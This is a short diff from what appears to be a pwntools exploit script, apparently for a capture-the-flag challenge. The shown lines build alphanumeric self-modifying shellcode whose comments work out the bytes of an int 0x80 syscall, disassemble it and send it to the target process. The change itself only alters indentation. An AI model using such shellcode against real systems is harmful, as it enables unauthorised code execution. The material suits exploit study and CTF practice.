@@ -29,9 +29,9 @@ cmd = 'b *0x80487e8\nc\nb *0x324f6e88\nc\nb *0x324f6efa\nc\nb *0x324f6f4d\nc'
 
 base = 0x324f6e4d
 sh = (
-	'PSSSSSSS' + 'Ba' + 'N' + 'Cf15MoO2' + # [0x324f6f4d] = 0x32 ^ 0xff = 0xcd
-        'F' * 0x27 + 'Cf15NoO2' # [0x324f6f4e] = 0x31 ^ 0x4c ^ 0xff = 0x80
-        'C' + 'N' * 0x27 + 'SPVWWWWW' + 'Ba'
+    'PSSSSSSS' + 'Ba' + 'N' + 'Cf15MoO2' + # [0x324f6f4d] = 0x32 ^ 0xff = 0xcd
+    'F' * 0x27 + 'Cf15NoO2' # [0x324f6f4e] = 0x31 ^ 0x4c ^ 0xff = 0x80
+    'C' + 'N' * 0x27 + 'SPVWWWWW' + 'Ba'
 ).ljust(0x100, 'P') + '2Y'
 print disasm(sh)
 p.sendline(sh)
